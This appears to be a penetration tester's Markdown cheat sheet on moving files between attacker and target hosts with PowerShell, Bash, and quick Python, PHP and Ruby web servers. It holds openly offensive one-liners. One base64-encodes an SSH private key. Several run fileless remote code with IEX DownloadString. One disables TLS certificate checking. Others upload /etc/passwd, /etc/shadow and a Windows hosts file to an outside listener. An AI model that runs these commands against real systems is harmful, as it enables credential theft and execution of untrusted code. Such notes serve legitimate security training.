# File Transfers
____
## Base64 Encode/Decode

### Powershell

#### Encoding a file
``` powershell
[Convert]::ToBase64String((Get-Content -path "C:\my_file" -Encoding byte))
```
#### Decoding into a file
``` powershell
[IO.File]::WriteAllBytes("C:\my_file", [Convert]::FromBase64String("<BASE64>"));
```

### Bash

#### Encoding a file
``` bash
cat id_rsa | base64 -w 0; echo
```

#### Decoding into a file
``` bash
echo <BASE64> | base64 -d > my_file
```
____
## HTTP

## Creating a webserver on linux
Python3 http server
``` bash
python3 -m http.server <PORT>
```
Python3 upload server
``` bash
pip3 install uploadserver
python3 -m uploadserver
```
Python3 upload server with self-signed certificate
``` bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
```
Python2.7 simple http server
``` bash
python2.7 -m SimpleHTTPServer
```
PHP web server
``` bash
php -S 0.0.0.0:8000
```
Ruby web server
``` bash
ruby -run -ehttpd . -p8000
```

## Downloading from webserver

### Linux
``` bash
wget <URL>
```

### Windows

#### File Download with Invoke-WebRequest (wget, iwr, curl)
``` powershell
wget <URL> -OutFile my_file
```

#### File Download with DownloadFile Method
``` powershell
(New-Object Net.WebClient).DownloadFile('<URL>','<SAVE-TO-PATH>')
```

#### Fileless Method with DownloadString and Invoke-Expression
``` powershell
IEX (New-Object Net.WebClient).DownloadString('<URL>')
```
``` powershell
(New-Object Net.WebClient).DownloadString('<URL>') | IEX
```

#### Other Download methods
|Method|Description|
|---|---|
|   OpenRead    |	Returns the data from a resource as a Stream.|
|OpenReadAsync|	Returns the data from a resource without blocking the calling thread.|
|DownloadData|	Downloads data from a resource and returns a Byte array.|
|DownloadDataAsync|	Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|DownloadFile|	Downloads data from a resource to a local file.|
|DownloadFileAsync|	Downloads data from a resource to a local file without blocking the calling thread.|
|DownloadString|	Downloads a String from a resource and returns a String.|
|DownloadStringAsync|	Downloads a String from a resource without blocking the calling thread.|

More: [https://gist.github.com/HarmJ0y/bb48307ffa663256e239](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

#### Common Errors with Powershell

1. ##### Internet Explorer engine is not available
``` powershell
Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
```
Solution:
Use the parameter `UseBasicParsing`
```
Invoke-WebRequest <URL> -UseBasicParsing | IEX
```

2. ##### Could not establish trust relationship for the SSL/TLS secure channel.
``` powershell
Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
```
Solution:
```
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## Uploading to webserver

### Linux
``` bash
curl -X POST <WEBSRV-URL> -F 'files=@/etc/passwd' -F 'files=@/etc/shadow'
```
> Use `--insecure`, if you used a self-signed certificate when creating the webserver
### Windows

#### Using PSUpload script
``` powershell
IEX(New-Object Net.WebClient).DownloadString('<URL>')
Invoke-FileUpload -Uri <WEBSRV-URL> -File <FILE-TO-UPLOAD>
```

#### Using base64 and Invoke-WebRequest
``` powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri <WEBSRV-URL> -Method POST -Body $b64
```
On the web server
``` bash
nc -lvnp 8000

listening on [any] 8000 ...
connect to [10.10.10.10] from (UNKNOWN) [11.11.11.11] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 10.10.10.10:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OT...<SNIP>...
```